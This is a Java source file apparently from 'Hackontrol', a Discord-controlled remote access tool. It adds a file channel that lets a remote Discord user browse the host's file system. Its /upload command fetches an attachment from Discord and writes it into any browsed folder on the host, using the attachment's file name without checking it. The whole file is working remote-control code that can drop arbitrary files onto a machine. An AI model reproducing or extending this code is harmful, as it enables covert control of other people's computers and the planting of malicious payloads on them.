package com.khopan.hackontrol.channel.file;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.manager.command.CommandContext;
import com.khopan.hackontrol.manager.command.CommandManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.manager.interaction.InteractionManager;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.HackontrolMessage;
import com.khopan.hackontrol.utils.TimeSafeReplyHandler;
import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;

import net.dv8tion.jda.api.entities.Message.Attachment;
import net.dv8tion.jda.api.interactions.commands.OptionMapping;
import net.dv8tion.jda.api.interactions.commands.OptionType;
import net.dv8tion.jda.api.interactions.commands.build.Commands;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.Button;

public class FileChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "file";

	private static final Button BUTTON_QUERY_FILE = ButtonManager.staticButton(ButtonType.SUCCESS, "Query File", "queryFile");

	private FileBrowser<?> browser;

	@Override
	public String getName() {
		return FileChannel.CHANNEL_NAME;
	}

	@Override
	public void preInitialize(Registry registry) {
		registry.register(InteractionManager.BUTTON_REGISTRY, FileChannel.BUTTON_QUERY_FILE, context -> this.browser = FileBrowser.start(context));
		registry.register(InteractionManager.MODAL_REGISTRY,  FileBrowser.MODAL_VIEW,        context -> this.browser.modalView(context));
		registry.register(InteractionManager.MODAL_REGISTRY,  FileBrowser.MODAL_GO_INTO,     context -> this.browser.modalGoInto(context));
		registry.register(CommandManager.COMMAND_REGISTRY,    Commands.slash("upload", "Upload a file").addOption(OptionType.ATTACHMENT, "file", "File to upload", true), this :: commandUploadFile);
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(FileChannel.BUTTON_QUERY_FILE)).queue();
	}

	private void commandUploadFile(CommandContext context) {
		OptionMapping fileOption = context.getOption("file");

		if(fileOption == null) {
			HackontrolError.message(context.reply(), "File option is missing");
			return;
		}

		if(this.browser.file == null || !this.browser.file.exists()) {
			HackontrolError.message(context.reply(), "No target location");
			return;
		}

		File targetFolder;

		if(this.browser.file.isDirectory()) {
			targetFolder = this.browser.file;
		} else {
			targetFolder = this.browser.file.getParentFile();
		}

		if(targetFolder == null) {
			HackontrolError.message(context.reply(), "File '" + this.browser.file.getAbsolutePath() + "' does not have a parent directory");
			return;
		}

		Attachment attachment = fileOption.getAsAttachment();
		String fileName = attachment.getFileName();
		File file = new File(targetFolder, fileName);
		TimeSafeReplyHandler.start(context, consumer -> {
			try {
				InputStream inputStream = attachment.getProxy().download().get();
				byte[] data = inputStream.readAllBytes();
				inputStream.close();
				FileOutputStream outputStream = new FileOutputStream(file);
				outputStream.write(data);
				outputStream.close();
				HackontrolMessage.deletable(ConsumerMessageCreateDataSendable.of(consumer), "`Upload to '" + file.getAbsolutePath() + "'`");
			} catch(Throwable Errors) {
				HackontrolError.throwable(ConsumerMessageCreateDataSendable.of(consumer), Errors);
			}
		});
	}
}
